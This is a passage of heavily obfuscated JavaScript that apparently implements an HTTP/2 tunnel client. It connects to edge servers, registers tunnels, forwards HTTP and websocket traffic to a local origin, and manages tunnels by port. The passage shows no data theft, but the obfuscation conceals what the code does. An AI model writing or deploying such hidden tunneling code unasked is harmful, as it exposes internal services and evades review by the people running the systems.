                        c[d6(0x4b6)],
                        c[d6(0x34d)]
                    ]
                ];
            this['sendHeaders'](a, j);
            for await (const p of d['body']) {
                await this['sendData'](a, p, ![]);
            }
            await this['sendData'](a, Buffer[d6(0x4fd)](0x0), !![]);
        } catch (q) {
            this[d6(0x6ce)][d6(0x1f9)](c['XLjPM'](c[d6(0x436)](c['oqPeA'](c['EKGra'], a), c[d6(0x5f7)]), q));
            try {
                this[d6(0x1fd)](a, [[
                        c['NJdVm'],
                        c['hdjyL']
                    ]], !![]);
            } catch (r) {
            }
        }
    }
    async [a0aI(0x6cf)]() {
        const d7 = a0aI, a = {
                'CUNZW': d7(0x30b),
                'KTKrw': function (d, f) {
                    return d + f;
                },
                'vztPy': function (d, f) {
                    return d === f;
                },
                'hgTHs': function (d, f) {
                    return d % f;
                },
                'fcrvR': d7(0x541),
                'ubDpV': function (d, f) {
                    return d < f;
                },
                'EWmbI': function (d, f) {
                    return d + f;
                },
                'ZhezO': function (d, f) {
                    return d === f;
                },
                'nRenx': function (d, f) {
                    return d - f;
                },
                'OFcpa': function (d, f) {
                    return d + f;
                },
                'EulQo': function (d, f) {
                    return d === f;
                },
                'zSIjj': function (d, f) {
                    return d >= f;
                },
                'YQUpE': function (d, f) {
                    return d & f;
                },
                'pqbZA': function (d, f) {
                    return d !== f;
                },
                'Zmuub': function (d, f) {
                    return d & f;
                },
                'PbgQr': function (d, f) {
                    return d + f;
                },
                'Pssda': function (d, f) {
                    return d === f;
                }
            }, b = await this[d7(0x22a)]['readExact'](0x18);
        if (!b[d7(0x356)](Buffer[d7(0x613)](d7(0x271))))
            throw new Error(a[d7(0x12e)]);
        const c = Buffer[d7(0x4fd)](0x6);
        c[d7(0x586)](0x3, 0x0), c['writeUInt32BE'](0x64, 0x2), this[d7(0x250)](0x4, 0x0, 0x0, c);
        this[d7(0x66d)] && !this['tunnelState'][d7(0x34a)] && (process[d7(0x1ac)][d7(0x19e)](a[d7(0x329)](this['tunnelUrl'], '\x0a')), this['tunnelState'][d7(0x34a)] = !![]);
        try {
            while (!this[d7(0x286)]) {
                const [d, f, g, h] = await this['readFrame']();
                if (a[d7(0x487)](d, 0x4)) {
                    if (!(f & 0x1)) {
                        if (a[d7(0x584)](h[d7(0x3d0)], 0x6))
                            throw new Error(a['fcrvR']);
                        for (let i = 0x0; a[d7(0x18d)](i, h[d7(0x3d0)]); i += 0x6) {
                            const j = h[d7(0x59f)](i), k = h[d7(0x14a)](a['EWmbI'](i, 0x2));
                            if (a[d7(0x12a)](j, 0x4)) {
                                const l = a[d7(0x2f4)](k, 0xffff);
                                for (const m of this[d7(0x3be)]['keys']()) {
                                    this[d7(0x3be)][d7(0x521)](m, Math[d7(0x183)](0x0, a[d7(0x330)](this[d7(0x3be)][d7(0x327)](m), l)));
                                }
                            } else
                                a[d7(0x53b)](j, 0x5) && a['zSIjj'](k, 0x4000) && k <= 0xffffff && (this[d7(0x49e)] = k);
                        }
                        this['sendFrame'](0x4, 0x1, 0x0);
                    }
                    continue;
                }
                if (a[d7(0x487)](d, 0x6)) {
                    !a[d7(0x668)](f, 0x1) && this['sendFrame'](0x6, 0x1, 0x0, h);
                    continue;
                }
                if (d === 0x8) {
                    if (a['pqbZA'](h[d7(0x3d0)], 0x4))
                        continue;
                    const n = a[d7(0x341)](h['readUInt32BE'](0x0), 0x7fffffff);
                    g === 0x0 ? this[d7(0x6b3)] += n : this[d7(0x3be)]['set'](g, a['PbgQr'](this[d7(0x3be)]['get'](g) ?? 0xffff, n));
                    this[d7(0x679)]();
                    continue;
                }
                if (d === 0x3) {
                    this[d7(0x393)][d7(0xeb)](g);
                    continue;
                }
                if (d === 0x7)
                    break;
                if (a[d7(0x361)](d, 0x1)) {
                    const o = await this[d7(0x527)](f, g, h);
                    !this['streamWindows'][d7(0xf9)](g) && this[d7(0x3be)][d7(0x521)](g, 0xffff);
                    this['handleHeaders'](g, f, o);
                    continue;
                }
                if (a[d7(0x12a)](d, 0x0)) {
                    this[d7(0x5db)](g, f, h);
                    continue;
                }
            }
        } finally {
            this['stopped'] = !![], this['_releaseWaiters']();
            for (const p of this[d7(0x393)][d7(0x640)]()) {
                p[d7(0x25f)] && p[d7(0x25f)]['stop']();
            }
            try {
                this[d7(0x37c)][d7(0x27e)]();
            } catch (q) {
            }
        }
    }
    ['handleHeaders'](a, b, c) {
        const d8 = a0aI, d = {
                'LnNrN': function (i, j) {
                    return i === j;
                },
                'juoQw': function (i, j) {
                    return i & j;
                },
                'MJgPK': ':method',
                'KaniA': d8(0x1fc),
                'gwtlr': d8(0x31a),
                'ZDMSS': d8(0x6d2),
                'ndsho': function (i, j) {
                    return i === j;
                },
                'DFyAF': 'websocket',
                'UUcJm': function (i, j) {
                    return i === j;
                },
                'QnTLJ': d8(0x2e2),
                'enRus': function (i, j) {
                    return i(j);
                }
            }, f = {};
        for (const [i, j] of c) {
            i[d8(0x1bd)](':') ? f[i] = j : f[i[d8(0x43b)]()] = j;
        }
        const g = (f[a0V] || '')['trim']()[d8(0x43b)]();
        if (d[d8(0x63c)](g, a0W)) {
            this[d8(0x47a)](a);
            d['juoQw'](b, 0x1) && (this[d8(0x2ba)][d8(0x3cb)] = !![]);
            return;
        }
        const h = {
            'method': f[d[d8(0x545)]] || d[d8(0x1bc)],
            'path': f[d[d8(0x303)]] || '/',
            'authority': f[d[d8(0x278)]] || '',
            'headers': c['filter'](([k]) => !k[d8(0x1bd)](':')),
            'body': [],
            'upgrade': g,
            'websocket': d[d8(0x155)](g, d[d8(0x36a)]) || d[d8(0x164)]((f[d[d8(0x55b)]] || '')[d8(0x43b)](), d['DFyAF']),
            'ended': d['enRus'](Boolean, d[d8(0x26b)](b, 0x1)),
            'finished': ![]
        };
        this[d8(0x393)][d8(0x521)](a, h);
        if (h[d8(0x4fe)])
            h['websocketProxy'] = new a0ap(this, a, h, this['origin'], this[d8(0x6ce)]), h[d8(0x25f)][d8(0x3f7)]();
        else
            h[d8(0x29b)] && this[d8(0x253)](a, h);
    }
    [a0aI(0x5db)](a, b, c) {
        const d9 = a0aI, d = {
                'XVlBu': function (g, h) {
                    return g !== h;
                },
                'CsRqL': function (g, h) {
                    return g === h;
                },
                'NRfGZ': function (g, h) {
                    return g & h;
                },
                'lcbcC': function (g, h) {
                    return g === h;
                },
                'NRtQe': function (g, h) {
                    return g(h);
                }
            };
        this[d9(0x45d)](0x0, c[d9(0x3d0)]), this[d9(0x45d)](a, c[d9(0x3d0)]);
        if (d[d9(0x39a)](this[d9(0x2ba)], null) && d[d9(0x3f9)](this[d9(0x2ba)][d9(0x2ad)], a)) {
            this[d9(0x2ba)][d9(0x4ae)](c);
            d['NRfGZ'](b, 0x1) && (this[d9(0x2ba)][d9(0x3cb)] = !![]);
            return;
        }
        const f = this['streams']['get'](a);
        if (d[d9(0x42c)](f, undefined))
            return;
        if (f[d9(0x25f)] !== undefined) {
            f[d9(0x25f)]['feed'](c, d[d9(0x45b)](Boolean, d[d9(0x373)](b, 0x1)));
            return;
        }
        c[d9(0x3d0)] && f[d9(0x42a)][d9(0x6aa)](c), d[d9(0x373)](b, 0x1) && (f['ended'] = !![], this['requestFinished'](a, f));
    }
}
class a0ap {
    constructor(a, b, c, d, f) {
        const da = a0aI, g = { 'lvhxD': da(0xe0) }, h = g[da(0x58e)][da(0x67f)]('|');
        let i = 0x0;
        while (!![]) {
            switch (h[i++]) {
            case '0':
                this[da(0x413)] = a;
                continue;
            case '1':
                this[da(0x422)] = d;
                continue;
            case '2':
                this[da(0x636)] = [];
                continue;
            case '3':
                this['waiters'] = [];
                continue;
            case '4':
                this[da(0x2ad)] = b;
                continue;
            case '5':
                this[da(0x286)] = ![];
                continue;
            case '6':
                this[da(0x6ce)] = f;
                continue;
            case '7':
                this[da(0x37c)] = null;
                continue;
            case '8':
                this[da(0x18a)] = c;
                continue;
            }
            break;
        }
    }
    [a0aI(0x3f7)]() {
        this['run']()['catch'](() => {
        });
    }
    [a0aI(0x4ae)](a, b = ![]) {
        const db = a0aI;
        a['length'] && this[db(0x636)]['push'](a), b && this[db(0x636)][db(0x6aa)](null), this[db(0x29f)]();
    }
    [a0aI(0x3de)]() {
        const dc = a0aI;
        if (this['stopped'])
            return;
        this['stopped'] = !![], this[dc(0x29f)]();
        if (this['sock'] !== null)
            try {
                this[dc(0x37c)][dc(0x27e)]();
            } catch (a) {
            }
    }
    [a0aI(0x29f)]() {
        const dd = a0aI, a = {
                'lJMsI': function (b) {
                    return b();
                }
            };
        for (const b of this[dd(0x235)]) {
            a[dd(0x24a)](b);
        }
        this[dd(0x235)] = [];
    }
    async [a0aI(0x1f8)]() {
        const de = a0aI;
        while (!this['stopped']) {
            if (this[de(0x636)][de(0x3d0)])
                return this[de(0x636)]['shift']();
            await new Promise(a => this[de(0x235)][de(0x6aa)](a));
        }
        return null;
    }
    async [a0aI(0x6cf)]() {
        const df = a0aI, a = {
                'zlhTI': function (b, c) {
                    return b(c);
                },
                'ZMlUO': function (b, c) {
                    return b === c;
                },
                'jjkkL': df(0x64d),
                'PBWKm': df(0x24d),
                'esysT': 'cf-proxy-',
                'CQLKh': df(0x29e),
                'CJfLi': function (b, c) {
                    return b === c;
                },
                'NQVUO': df(0x5c4),
                'hPvkR': function (b, c) {
                    return b(c);
                },
                'saDXm': df(0x617),
                'xsbTC': df(0x66b),
                'RsQSt': df(0x53a),
                'wzgpm': function (b, c) {
                    return b + c;
                },
                'lKjEQ': function (b, c) {
                    return b + c;
                },
                'UUqVq': df(0x4a8)
            };
        try {
            this[df(0x37c)] = await a[df(0x32b)](a0ar, this[df(0x422)]), this['sendHandshake']();
            const b = await a[df(0x32b)](a0au, this[df(0x37c)]), c = [], d = [];
            for (const [i, j] of b[df(0x4b5)]) {
                const k = i[df(0x43b)]();
                a['ZMlUO'](k, a[df(0x57d)]) && d[df(0x6aa)]([
                    k,
                    j
                ]);
                const l = k['startsWith'](df(0x6a6)) || k[df(0x1bd)](a['PBWKm']) || k[df(0x1bd)](a[df(0x526)]) || k[df(0x1bd)](':');
                (!l || a[df(0x507)](k, df(0x413)) || k === a[df(0x425)] || a['CJfLi'](k, a[df(0x302)])) && c[df(0x6aa)]([
                    k,
                    j
                ]);
            }
            const f = a['hPvkR'](a0am, c), g = a['ZMlUO'](b[df(0x609)], 0x65) ? 0xc8 : b[df(0x609)], h = [
                    [
                        a['saDXm'],
                        String(g)
                    ],
                    ...d,
                    [
                        a[df(0x64b)],
                        f
                    ],
                    [
                        a[df(0x3d7)],
                        df(0x1c3)
                    ]
                ];
            this[df(0x413)]['sendHeaders'](this[df(0x2ad)], h), this[df(0x2cb)]()[df(0x5fd)](() => {
            }), await this['pumpOrigin'](b[df(0x3b3)]);
        } catch (m) {
            this[df(0x6ce)][df(0x1f9)](a[df(0x1fb)](a['lKjEQ'](df(0x254) + this['streamId'], df(0x50b)), m));
            try {
                this[df(0x413)][df(0x1fd)](this[df(0x2ad)], [[
                        a[df(0x61a)],
                        a['UUqVq']
                    ]], !![]);
            } catch (n) {
            }
        } finally {
            this[df(0x3de)]();
        }
    }
    async [a0aI(0x482)](a) {
        const dg = a0aI;
        a[dg(0x3d0)] && await this[dg(0x413)]['sendData'](this['streamId'], a, ![]);
        for await (const b of this[dg(0x37c)]) {
            if (this[dg(0x286)])
                break;
            await this[dg(0x413)][dg(0x2e5)](this[dg(0x2ad)], b, ![]);
        }
        !this[dg(0x286)] && await this[dg(0x413)][dg(0x2e5)](this[dg(0x2ad)], Buffer['alloc'](0x0), !![]);
    }
    async [a0aI(0x2cb)]() {
        const dh = a0aI, a = {
                'mtbrJ': function (b, c) {
                    return b === c;
                }
            };
        while (!this[dh(0x286)]) {
            const b = await this[dh(0x1f8)]();
            if (a[dh(0x4ce)](b, null))
                return;
            try {
                this[dh(0x37c)][dh(0x19e)](b);
            } catch (c) {
                this[dh(0x286)] = !![];
                return;
            }
        }
    }
    ['sendHandshake']() {
        const di = a0aI, a = {
                'ZKNDX': function (i, j) {
                    return i + j;
                },
                'VrfXb': function (i, j) {
                    return i + j;
                },
                'Gosvs': di(0x3bd),
                'nFFFR': di(0x44e),
                'HEXFg': 'host',
                'TXCNw': function (i, j) {
                    return i === j;
                },
                'RFJrF': di(0x413),
                'EcXAj': 'upgrade',
                'yYXNe': di(0x64d),
                'XLHJR': function (i, j) {
                    return i === j;
                },
                'abJCs': di(0x20b),
                'Mlzju': function (i, j) {
                    return i + j;
                },
                'UTbId': 'Host:\x20',
                'MTQyS': function (i, j) {
                    return i + j;
                },
                'syTsW': di(0x553),
                'gOMBQ': di(0x68a),
                'abJqD': 'Sec-WebSocket-Version:\x2013',
                'YtdVD': di(0x6df),
                'qOagK': di(0x51f),
                'YcntV': function (i, j) {
                    return i + j;
                },
                'MMNou': di(0x688),
                'jlBYf': di(0x1a8)
            }, b = new URL(this['origin']), c = this[di(0x18a)][di(0x52a)][di(0x1bd)]('/') ? this[di(0x18a)][di(0x52a)] : a[di(0xc4)]('/', this[di(0x18a)][di(0x52a)]), d = [a[di(0xc4)](a['VrfXb'](a['Gosvs'], c), a[di(0x446)])];
        let f = ![], g = ![], h = ![];
        for (const [i, j] of this[di(0x18a)][di(0x4b5)]) {
            const k = i[di(0x43b)]();
            if (k === a['HEXFg'] || a['TXCNw'](k, a[di(0x2fa)]) || a['TXCNw'](k, a[di(0x46e)]) || a[di(0x486)](k, a[di(0x318)]) || a[di(0x486)](k, di(0x622)))
                continue;
            if (k === 'sec-websocket-key')
                f = !![];
            else {
                if (a[di(0x44a)](k, a[di(0x512)]))
                    g = !![];
                else
                    a[di(0x44a)](k, di(0x422)) && (h = !![]);
            }
            d[di(0x6aa)](a[di(0x4f8)](a[di(0x4dc)](i, ':\x20'), j));
        }
        d[di(0x6aa)](a[di(0x4f8)](a[di(0x3f2)], b[di(0x335)])), !h && this[di(0x18a)]['authority'] && d[di(0x6aa)](a['MTQyS'](di(0x53e), this[di(0x18a)][di(0x311)])), !f && d[di(0x6aa)](a[di(0x61f)] + a0k[di(0x3d5)](0x10)[di(0x406)](a[di(0x412)])), !g && d[di(0x6aa)](a[di(0x28c)]), d[di(0x6aa)](a[di(0x483)]), d[di(0x6aa)](a[di(0x19d)]), this[di(0x37c)][di(0x19e)](Buffer['from'](a['YcntV'](d[di(0x64a)]('\x0d\x0a'), a[di(0x5c8)]), a[di(0x2d3)]));
    }
}
class a0aq {
    constructor(a, b, c) {
        const dj = a0aI, d = { 'vzFBL': dj(0x39f) }, f = d[dj(0x597)][dj(0x67f)]('|');
        let g = 0x0;
        while (!![]) {
            switch (f[g++]) {
            case '0':
                this['finished'] = ![];
                continue;
            case '1':
                this[dj(0x413)] = a;
                continue;
            case '2':
                this[dj(0x6ce)] = c;
                continue;
            case '3':
                this[dj(0x2de)] = Buffer[dj(0x4fd)](0x0);
                continue;
            case '4':
                this['streamId'] = b;
                continue;
            }
            break;
        }
    }
    ['start'](a, b, c, d) {
        const dk = a0aI, f = {
                'yEZmZ': function (g, h) {
                    return g(h);
                },
                'hQFuQ': function (g, h, i, j, k, l, m) {
                    return g(h, i, j, k, l, m);
                }
            };
        this[dk(0x413)][dk(0x2e5)](this[dk(0x2ad)], f[dk(0x3e1)](a0ab, 0x0), ![]), this[dk(0x413)][dk(0x2e5)](this['streamId'], f[dk(0x60b)](a0ac, 0x1, 0x0, a, b, c, d), ![]);
    }
    [a0aI(0x4ae)](a) {
        const dl = a0aI, b = {
                'uuRrf': function (f, g) {
                    return f(g);
                },
                'DJsRy': function (f, g) {
                    return f + g;
                },
                'yckre': dl(0x52c),
                'uzSsY': dl(0x468),
                'ySuNE': 'tunnel\x20registration\x20failed:\x20',
                'oibMR': dl(0x568),
                'GfvZH': function (f, g) {
                    return f + g;
                },
                'qmRGJ': dl(0x699)
            };
        this[dl(0x2de)] = this[dl(0x2de)][dl(0x3d0)] ? Buffer[dl(0x1c8)]([
            this[dl(0x2de)],
            a
        ]) : a;
        let c, d;
        [c, d] = b['uuRrf'](a0ad, this['buffer']), this['buffer'] = d;
        for (const f of c) {
            try {
                const g = b[dl(0x351)](a0ag, f);
                g['ok'] ? (this[dl(0x6ce)]['info'](b[dl(0x4c2)](b[dl(0x1ff)], g[dl(0x25a)] || b['uzSsY'])), this['connection'][dl(0x4ef)] = !![]) : this['log'][dl(0x1f9)](b[dl(0x28d)] + (g[dl(0xdc)] || b[dl(0x13c)]));
            } catch (h) {
                this[dl(0x6ce)][dl(0x48b)](b[dl(0x1f6)](b[dl(0x23d)], h));
            }
        }
    }
}
function a0ar(a) {
    const dm = a0aI, b = {
            'QtRmo': dm(0x377),
            'LsnLv': function (c, d) {
                return c(d);
            },
            'VZuGb': function (c, d, f) {
                return c(d, f);
            },
            'zHNYm': function (c, d, f) {
                return c(d, f);
            },
            'mzilb': dm(0x452),
            'iyqci': function (c, d) {
                return c(d);
            },
            'WKvSy': dm(0x407),
            'jocGK': 'https:',
            'BNjIq': dm(0x41e),
            'wjNWq': function (c, d) {
                return c === d;
            },
            'aMLvU': 'error',
            'Pnums': dm(0x5c5)
        };
    return new Promise((c, d) => {
        const dp = dm, f = {
                'uyDnl': function (n, o, p) {
                    return n(o, p);
                },
                'EPzWo': function (n, o, p) {
                    return b['VZuGb'](n, o, p);
                },
                'uPNaP': function (n, o, p) {
                    const dn = a0b;
                    return b[dn(0x4f4)](n, o, p);
                },
                'pOmQw': 'error',
                'JQnCu': b['mzilb']
            };
        let g;
        try {
            g = new URL(a);
        } catch (n) {
            b[dp(0x1b9)](d, new Error(dp(0x41e)));
            return;
        }
        if (![
                b[dp(0x658)],
                b[dp(0x294)]
            ][dp(0x664)](g['protocol']) || !g[dp(0x471)]) {
            d(new Error(b[dp(0x696)]));
            return;
        }
        const h = b[dp(0x698)](g[dp(0x539)], b[dp(0x294)]), i = g[dp(0x1b6)] || (h ? 0x1bb : 0x50), j = a0i[dp(0x5c5)]({
                'host': g['hostname'],
                'port': i
            });
        let k = ![];
        const l = (o, p) => {
                const dq = dp, q = b[dq(0x1c9)]['split']('|');
                let r = 0x0;
                while (!![]) {
                    switch (q[r++]) {
                    case '0':
                        if (k)
                            return;
                        continue;
                    case '1':
                        b[dq(0x410)](o, p);
                        continue;
                    case '2':
                        j[dq(0x369)](dq(0xdc), m);
                        continue;
                    case '3':
                        j[dq(0x287)](0x0);
                        continue;
                    case '4':
                        k = !![];
                        continue;
                    }
                    break;
                }
            }, m = o => {
                const dr = dp;
                !k && f[dr(0x69a)](l, d, o);
            };
        j['on'](b['aMLvU'], m), j[dp(0x287)](0x7530, () => j[dp(0x27e)](new Error('origin\x20connection\x20timeout'))), j['on'](b[dp(0x4ad)], () => {
            const dt = dp, o = {
                    'wAIfd': function (q, r, s) {
                        const ds = a0b;
                        return f[ds(0x69a)](q, r, s);
                    }
                };
            if (!h) {
                f[dt(0x4f7)](l, c, j);
                return;
            }
            const p = a0j[dt(0x5c5)]({
                'socket': j,
                'servername': g[dt(0x471)]
            });
            p['on'](f[dt(0x2c0)], q => {
                const du = dt;
                !k && o[du(0x592)](l, d, q);
            }), p['on'](f['JQnCu'], () => {
                const dv = dt;
                f[dv(0xf0)](l, c, p);
            });
        });
    });
}
function a0as(a) {
    const dw = a0aI, b = {
            'NPIiw': function (d, f) {
                return d < f;
            }
        }, c = [];
    for (let d = 0x0; b[dw(0x60c)](d, a[dw(0x4b9)][dw(0x3d0)]); d += 0x2) {
        c[dw(0x6aa)]([
            a[dw(0x4b9)][d],
            a[dw(0x4b9)][d + 0x1]
        ]);
    }
    return c;
}
function a0at(a, b, c, d, f) {
    const dx = a0aI, g = {
            'Qqlvu': function (h, i) {
                return h(i);
            },
            'YMKwt': 'origin\x20must\x20be\x20an\x20http://\x20or\x20https://\x20URL',
            'adtsp': dx(0x407),
            'cvYKH': dx(0x2d0),
            'FigeN': function (h, i) {
                return h === i;
            },
            'dDlYw': dx(0x335),
            'ASAAk': function (h, i) {
                return h === i;
            },
            'HpqLB': dx(0x622),
            'pvDPf': dx(0x3ce),
            'CJcCd': function (h, i) {
                return h(i);
            },
            'RvPdx': dx(0xdc)
        };
    return new Promise((h, i) => {
        const dz = dx, j = {
                'CpYTE': function (r, s) {
                    return g['Qqlvu'](r, s);
                },
                'xdwIl': function (r, s) {
                    const dy = a0b;
                    return g[dy(0x163)](r, s);
                }
            };
        let k;
        try {
            k = new URL(a);
        } catch (r) {
            i(new Error(g['YMKwt']));
            return;
        }
        if (![
                g[dz(0x21a)],
                g[dz(0x293)]
            ][dz(0x664)](k['protocol']) || !k[dz(0x471)]) {
            i(new Error(dz(0x41e)));
            return;
        }
        const l = g['FigeN'](k[dz(0x539)], g['cvYKH']), m = k[dz(0x1b6)] || (l ? 0x1bb : 0x50), n = {};
        for (const [s, t] of d) {
            const u = s[dz(0x43b)]();
            if (u === g['dDlYw'] || g[dz(0x42e)](u, dz(0x413)) || g[dz(0x130)](u, g['HpqLB']) || u === dz(0x64d))
                continue;
            n[s] = t;
        }
        n[g['pvDPf']] = k[dz(0x335)];
        f[dz(0x3d0)] && (n[dz(0x55d)] = g[dz(0x4c9)](String, f['length']));
        const o = c[dz(0x1bd)]('/') ? c : '/' + c, p = l ? a0h : a0g, q = p[dz(0x18a)]({
                'hostname': k[dz(0x471)],
                'port': m,
                'path': o,
                'method': b,
                'headers': n,
                'timeout': 0x7530
            }, v => {
                const dA = dz;
                j[dA(0x4c7)](h, {
                    'status': v[dA(0x54c)],
                    'headers': j[dA(0x61b)](a0as, v),
                    'body': v
                });
            });
        q['on'](g[dz(0x1f4)], v => i(v)), q[dz(0x3c8)](f[dz(0x3d0)] ? f : undefined);
    });
}
function a0au(a) {
    const dB = a0aI, b = {
            'ANqIT': function (c, d) {
                return c < d;
            },
            'CHXHB': function (c) {
                return c();
            },
            'CMPXe': dB(0x1a8),
            'DVJTv': function (c, d, f) {
                return c(d, f);
            },
            'JLFBr': function (c, d) {
                return c(d);
            },
            'kyXjK': dB(0x46c),
            'SILxX': function (c, d) {
                return c < d;
            },
            'LPVAR': function (c, d) {
                return c > d;
            },
            'AxkuX': function (c, d) {
                return c + d;
            },
            'sjVqG': function (c, d) {
                return c(d);
            },
            'LqPHy': 'data',
            'lWpEf': dB(0x107),
            'NWdZi': dB(0x165),
            'nZgEg': dB(0xdc),
            'VknJA': 'end'
        };
    return new Promise((c, d) => {
        const dC = dB, f = {
                'XDlFM': b[dC(0x445)],
                'Okfqn': dC(0xdc),
                'MWOxj': 'end',
                'RgJdW': b['lWpEf'],
                'wOpKV': function (l) {
                    return l();
                },
                'eDtpD': function (l, m) {
                    return l(m);
                },
                'zLOzs': b[dC(0x54b)]
            };
        let g = Buffer['alloc'](0x0);
        const h = () => {
                const dD = dC;
                a[dD(0x369)](f['XDlFM'], i), a[dD(0x369)](f[dD(0x536)], j), a['removeListener'](f[dD(0x2fc)], k), a[dD(0x369)](f[dD(0x14c)], k);
            }, i = l => {
                const dE = dC;
                g = g[dE(0x3d0)] ? Buffer['concat']([
                    g,
                    l
                ]) : l;
                const m = g[dE(0x1b4)](dE(0x688));
                if (b['ANqIT'](m, 0x0))
                    return;
                b[dE(0x20c)](h);
                const n = g['subarray'](0x0, m)['toString'](b[dE(0x3a0)]), o = n[dE(0x67f)]('\x0d\x0a'), p = o[0x0][dE(0x67f)]('\x20'), q = b[dE(0x32e)](parseInt, p[0x1], 0xa);
                if (!Number['isInteger'](q)) {
                    b[dE(0x6d3)](d, new Error(b[dE(0x14d)]));
                    return;
                }
                const r = [];
                for (let s = 0x1; b[dE(0x61e)](s, o[dE(0x3d0)]); s++) {
                    const t = o[s];
                    if (!t)
                        continue;
                    const u = t[dE(0x1b4)](':');
                    b[dE(0x348)](u, 0x0) && r['push']([
                        t[dE(0x10d)](0x0, u)['trim'](),
                        t[dE(0x10d)](b['AxkuX'](u, 0x1))['trim']()
                    ]);
                }
                b[dE(0x285)](c, {
                    'status': q,
                    'headers': r,
                    'rest': g[dE(0xfa)](b[dE(0x25e)](m, 0x4))
                });
            }, j = l => {
                const dF = dC;
                f[dF(0x561)](h), d(l);
            }, k = () => {
                const dG = dC;
                h(), f[dG(0x5e4)](d, new Error(f[dG(0x2f7)]));
            };
        a['on'](b[dC(0x445)], i), a['on'](b['nZgEg'], j), a['on'](b[dC(0x27d)], k), a['on'](b[dC(0x6a1)], k);
    });
}
function a0av(a, b) {
    const dH = a0aI, c = {
            'pfpLq': dH(0x522),
            'bQjOl': 'error',
            'TwHMB': function (h, i) {
                return h + i;
            },
            'lDsoI': function (h, i) {
                return h + i;
            },
            'rulzJ': dH(0x50b),
            'oEhzy': function (h, i) {
                return h + i;
            },
            'lCNew': function (h) {
                return h();
            }
        }, d = a0T[dH(0x10d)]()['sort'](() => Math['random']() - 0.5);
    let f = null;
    const g = async () => {
        const dI = dH, h = {
                'ryEDi': function (i, j) {
                    return i !== j;
                },
                'qEgbw': dI(0x63d),
                'kvRAa': function (i, j) {
                    return i + j;
                },
                'fIfSD': c[dI(0x11a)],
                'unHoG': c[dI(0x620)]
            };
        for (const i of d) {
            try {
                return await new Promise((j, k) => {
                    const dJ = dI, l = a0j[dJ(0x5c5)]({
                            'host': i,
                            'port': a0U,
                            'ALPNProtocols': ['h2'],
                            'servername': h['fIfSD'],
                            'rejectUnauthorized': a
                        });
                    l[dJ(0x287)](0x2710, () => l[dJ(0x27e)](new Error('connection\x20timeout'))), l['on'](h[dJ(0x32d)], k), l['on'](dJ(0x452), () => {
                        const dK = dJ, m = l[dK(0x6b8)];
                        if (m && h['ryEDi'](m, 'h2')) {
                            l[dK(0x27e)](new Error(h[dK(0x288)]));
                            return;
                        }
                        l[dK(0x287)](0x0), b[dK(0x6be)](h['kvRAa'](h[dK(0x581)](dK(0x51a), i), ':') + a0U), j(l);
                    });
                });
            } catch (j) {
                f = j, b[dI(0x1f9)](c[dI(0x4df)](c[dI(0x3ae)](dI(0x6d6), i) + c['rulzJ'], j));
            }
        }
        throw new Error(c[dI(0x3eb)](dI(0x357), f));
    };
    return c[dH(0x137)](g);
}
const a0aw = 0x2;
function a0ax(a) {
    const dL = a0aI, b = {
            'frdok': function (c, d) {
                return c === d;
            },
            'oKXRj': dL(0x450),
            'rmLkz': dL(0x201)
        };
    if (b[dL(0x4b1)](typeof a, b[dL(0x21c)])) {
        const c = a[dL(0x162)]();
        if (c)
            try {
                return JSON[dL(0x65e)](c);
            } catch (d) {
            }
        return {};
    }
    return a && b['frdok'](typeof a, b[dL(0x233)]) ? a : {};
}
class a0ay {
    constructor(a) {
        const dM = a0aI;
        this[dM(0x6ce)] = a, this['tunnels'] = new Map();
    }
    async [a0aI(0x66a)](a, b) {
        const dN = a0aI, c = {
                'YlSRV': function (l, m) {
                    return l > m;
                },
                'OcMOT': function (l, m) {
                    return l(m);
                },
                'IAdMo': dN(0x69d),
                'iCCGO': dN(0x20f),
                'BdIof': function (l, m) {
                    return l + m;
                },
                'vRcvf': function (l, m) {
                    return l + m;
                },
                'roFsg': function (l, m) {
                    return l + m;
                },
                'CiWTz': dN(0x4e5)
            }, d = this[dN(0x589)][dN(0x327)](a) || [];
        if (c[dN(0x418)](d[dN(0x3d0)], 0x0) && !b) {
            const l = new Error('tunnel\x20already\x20exists\x20on\x20port\x20' + a + dN(0x49c));
            l['status'] = 0x199, l[dN(0x1b6)] = a;
            throw l;
        }
        let f, g, h, i;
        try {
            [f, g, h, i] = await c[dN(0x61d)](a0al, c[dN(0x2d6)]);
        } catch (m) {
            const n = new Error(dN(0x4e0) + m[dN(0x3f8)]);
            n[dN(0x609)] = 0x1f4, n[dN(0x1b6)] = a;
            throw n;
        }
        const j = f[dN(0x1bd)](c[dN(0x308)]) ? f : c[dN(0x4fa)](c[dN(0x308)], f), k = {
                'tunnelDomain': j,
                'port': a,
                'createdAt': new Date()[dN(0x149)]()[dN(0x4e4)](/\.\d{3}Z$/, 'Z'),
                'stopped': ![],
                'sock': null,
                'runPromise': null
            };
        return k[dN(0x38b)] = this[dN(0x277)](k, g, h, i)[dN(0x5fd)](o => this[dN(0x6ce)]['warning'](dN(0x3c4) + j + dN(0x6ac) + o['message'])), d['push'](k), this['tunnels'][dN(0x521)](a, d), this[dN(0x6ce)][dN(0x6be)](c[dN(0x34f)](c[dN(0x616)](dN(0x13f), j), c[dN(0x690)]) + a), k;
    }
    [a0aI(0x244)]() {
        const dO = a0aI, a = [], b = [...this[dO(0x589)][dO(0x6d0)]()][dO(0x65a)]((c, d) => c - d);
        for (const c of b) {
            for (const d of this['tunnels']['get'](c)) {
                a[dO(0x6aa)]({
                    'tunnel_domain': d['tunnelDomain'],
                    'port': d[dO(0x1b6)],
                    'created_at': d['createdAt']
                });
            }
        }
        return a;
    }
    async [a0aI(0x562)](a, b) {
        const dP = a0aI, c = {
                'arZMV': function (i, j) {
                    return i === j;
                },
                'gRWVJ': function (i, j) {
                    return i > j;
                },
                'eiVMg': function (i, j) {
                    return i === j;
                },
                'Dsimk': function (i, j) {
                    return i + j;
                }
            }, d = this[dP(0x589)][dP(0x327)](a) || [];
        if (c[dP(0x496)](d[dP(0x3d0)], 0x0))
            return {
                'status': 0x194,
                'message': 'no\x20tunnel\x20found\x20on\x20port\x20' + a
            };
        let f;
        if (c[dP(0x496)](b, undefined) || c['arZMV'](b, null) || c['arZMV'](b, '')) {
            if (c[dP(0x508)](d[dP(0x3d0)], 0x1))
                return {
                    'status': 0x199,
                    'message': 'multiple\x20tunnels\x20exist\x20on\x20port\x20' + a + dP(0x54d)
                };
            f = d;
        } else {
            f = d['filter'](i => i[dP(0x5ce)] === b);
            if (c[dP(0x219)](f[dP(0x3d0)], 0x0))
                return {
                    'status': 0x194,
